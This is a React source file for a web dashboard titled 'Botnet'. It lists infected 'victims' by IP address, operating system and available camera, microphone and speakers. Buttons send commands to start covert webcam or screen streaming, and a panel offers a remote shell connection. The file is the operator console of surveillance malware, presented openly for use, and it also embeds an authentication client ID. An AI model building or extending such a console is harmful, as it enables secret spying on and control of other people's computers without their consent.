import React, { Component } from "react";
import compose from "lodash/flowRight";
import { HashRouter as Router, withRouter } from "react-router-dom";
// import { HashRouter as Router, withRouter, Link } from "react-router-dom";

import { EightBaseAppProvider } from '@8base/app-provider';
import { WebAuth0AuthClient } from '@8base/web-auth0-auth-client';

import gql from "graphql-tag";
import { graphql } from "react-apollo";

import "./index.css";
import "./App.css";


const VICTIMS_LIST_QUERY = gql`
	query VictimsList {
		victimsList(orderBy: [createdAt_DESC]) {
			items {
				id
				os
				ip
				hasCam
				hasMic
				hasSpeakers
				online
				command
				createdAt
			}
		}
	}
`;

const withVictims = graphql(VICTIMS_LIST_QUERY, {
	props: ({ data: { victimsList: ({ items } = {}) } }) => {
	return {
		victims: items || []
	};
},
});

const DELETE_VICTIMS_MUTATION = gql`
	mutation VictimsDelete($id: ID!) {
		victimDelete(filter: { id: $id }) {
			success
		}
	}
`;

const withRemoveVictims = graphql(DELETE_VICTIMS_MUTATION, {
	props: ({ mutate }) => ({
		removeVictims: (id) => {
			mutate({
				variables: { id },
				refetchQueries: [{ query: VICTIMS_LIST_QUERY }]
			});
		}
	})
});

const STREAM_VICTIMS_MUTATION = gql`
	mutation StreamScreen($id: ID!, $command: String) {
		victimUpdate (filter: { id: $id }, data: {
			command: $command
		}) {
		id
		command
		}
	}
`;
const withStreamScreen = graphql(STREAM_VICTIMS_MUTATION, {
	props: ({ mutate }) => ({
		streamScreen: (id, command) => {
			console.log('debug: ', { id, command });
			mutate({
				variables: { id, command },
				refetchQueries: [{ query: VICTIMS_LIST_QUERY }]
			});
		}
	})
});


class Main extends Component {

	render() {
		const {
			victims,
			removeVictims,
			streamScreen,
			// location,
		} = this.props;

		return victims && victims.length ? (
			<section className="main">
				<ul className="todo-list">
					{victims
						.map(victims => (
							<li
								key={victims.id}
								className={victims.online ? "online" : undefined}
							>
								<div className="view">
									<label
										className="bg-light shadow-sm"
										data-toggle="modal"
										data-target={"#" + victims.id}
									>{victims.ip} - {victims.os}</label>
									<button
										onClick={() => removeVictims(victims.id)}
										className="destroy"
									/>
									<div className="modal fade" id={victims.id} role="dialog">
										<div className="modal-dialog modal-lg">
											<div className="modal-content">
												<div className="modal-header">
													<h5 className="modal-title">Computer ID <b>{victims.id}</b></h5>
													<button type="button" className="close" data-dismiss="modal" aria-label="Close">
														<span aria-hidden="true">&times;</span>
													</button>
												</div>
												<div className="modal-body">
													<div className="row">
														<div className="col-6">
															<div
																style={{
																	backgroundColor: "#333333", color: "white", width: "100%", height: "100%", backgroundImage: "images/picture.png",
																	backgroundPosition: "center", backgroundSize: "contain", backgroundRepeat: "no-repeat"
																}}
																className="d-flex flex-column justify-content-around align-items-center imageView"
															>
																<div
																	className="align-self-center btn btn-primary"
																	style={{ cursor: "pointer", marginTop: "40px", display: (victims.command === null ? "" : "none") }}
																	onClick={() => streamScreen(victims.id, "cam")}
																>
																	View webcam
																</div>
																<hr style={{ borderTop: "1px solid rgba(255,255,255,0.6)", width: "95%", display: (victims.command === null ? "" : "none") }} />
																<div
																	className="align-self-center btn btn-primary"
																	style={{ cursor: "pointer", marginBottom: "40px", display: (victims.command === null ? "" : "none") }}
																	onClick={() => streamScreen(victims.id, "screen")}
																>
																	View screen
																</div>
																<div
																	className="align-self-bottom btn btn-danger"
																	style={{ cursor: "pointer", marginBottom: "-220px", display: (victims.command === null ? "none" : "") }}
																	onClick={() => streamScreen(victims.id, null)}
																>
																	Stop stream
																</div>
															</div>
														</div>
														<div className="col-3 d-flex flex-column small">
															<div className="p-2">OS:</div>
															<div className="p-2">IP Address:</div>
															<div className="p-2">Has camera:</div>
															<div className="p-2">Has microphone:</div>
															<div className="p-2">Has speaker:</div>
															<div className="p-2">Is online:</div>
															<div className="p-2">Command:</div>
															<div className="p-2">Created:</div>
														</div>
														<div className="col-3 d-flex flex-column small">
															<div className="p-2">{victims.os}</div>
															<div className="p-2">{victims.ip}</div>
															<div className="p-2">{(victims.hasCam ? "Yes" : "No")}</div>
															<div className="p-2">{(victims.hasMic ? "Yes" : "No")}</div>
															<div className="p-2">{(victims.hasSpeakers ? "Yes" : "No")}</div>
															<div className="p-2">{(victims.online ? "Yes" : "No")}</div>
															{/* <div className="p-2">{(victims.command === "" && victims.command === null ? "None" : victims.command)}</div> */}
															<div className="p-2">{(victims.command === "" || victims.command == null ? "None" : victims.command)}</div>
															<div className="p-2">{victims.createdAt.substring(0, 10)}</div>
														</div>
														<div className="col-12 mt-1">
															<textarea
																readOnly
																style={{ backgroundColor: "#222", color: "white", fontFamily: "monospace", fontSize: "13px", width: "100%", height: "240px", border: "0px" }}
																value="Click here to establish remote shell connection..."
															/>
														</div>
													</div>
												</div>
												<div className="modal-footer">
													<button type="button" className="btn btn-secondary" data-dismiss="modal">Close</button>
												</div>
											</div>
										</div>
									</div>
								</div>
							</li>
						))}
				</ul>
			</section>
		) : null;
	}
}


Main = compose(
	withRouter,
	withVictims,
	withRemoveVictims,
	withStreamScreen
)(Main);

const ENDPOINT_URL = 'https://api.8base.com/PUBLIC_API_KEY'
const AUTH_CLIENT_ID = 'qGHZVu5CxY5klivm28OPLjopvsYp0baD';
const AUTH_DOMAIN = 'auth.8base.com';

const authClient = new WebAuth0AuthClient({
	domain: AUTH_DOMAIN,
	clientId: AUTH_CLIENT_ID,
	redirectUri: `${window.location.origin}/auth/callback`,
	logoudivedirectUri: `${window.location.origin}/auth`,
});

class App extends Component {

	// Remove everything from here until...
	constructor() {
		super();
		const victims = [
			{
				id: '1',
				os: "windows",
				ip: "127.0.0.1",
				hasCam: true,
				hasMic: true,
				hasSpeakers: true,
				online: true
			},
		];

		this.state = { victims };
	}

	render() {
		return (
			<Router>
				{<EightBaseAppProvider uri={ENDPOINT_URL} authClient={authClient} >
					{({ loading }) => loading ? <div>"Loading..."</div> : (
						<div className="botnetapp">
							<header>
								<h1 className="mt-4">Botnet</h1>
							</header>
							<Main />
						</div>
					)}
				</EightBaseAppProvider>}
			</Router>
		);
	}
}

export default App;
